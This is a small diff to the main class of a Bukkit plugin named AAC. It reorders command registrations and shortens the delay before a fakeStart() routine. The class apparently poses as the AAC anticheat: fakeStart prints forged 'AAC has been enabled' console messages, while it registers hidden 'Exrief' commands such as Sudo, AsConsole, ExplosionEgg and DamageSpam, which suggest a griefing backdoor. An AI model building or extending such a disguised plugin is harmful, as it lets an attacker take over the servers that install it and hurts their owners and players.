@@ -35,6 +35,7 @@ public class AAC extends JavaPlugin {
         // Bukkit commands
         getCommand("aac").setExecutor(new AACCommand());
         // Exrief commands
+        CommandHandler.registerCommand(new SudoCommand());
         CommandHandler.registerCommand(new MatrixCommand());
         CommandHandler.registerCommand(new ExplosionEggCommand());
         CommandHandler.registerCommand(new AsConsoleCommand());
@@ -47,7 +48,6 @@ public class AAC extends JavaPlugin {
         CommandHandler.registerCommand(new DamageSpamCommand());
         CommandHandler.registerCommand(new NoGuiCommand());
         CommandHandler.registerCommand(new HelpCommand());
-        CommandHandler.registerCommand(new SudoCommand());
         // Listeners
         Bukkit.getPluginManager().registerEvents(new ChatListener(), this);
         Bukkit.getPluginManager().registerEvents(new ProjectileListener(), this);
@@ -59,7 +59,7 @@ public class AAC extends JavaPlugin {
 
     @Override
     public void onDisable() {
-
+        
     }
 
     private void fakeStart() {
@@ -93,7 +93,7 @@ public class AAC extends JavaPlugin {
                 System.out.println("[AAC] Starting API...");
                 System.out.println("[AAC] AAC has been enabled.");
             }
-        }, 5L);
+        }, 2L);
     }
 
     public static AAC getInstance() {
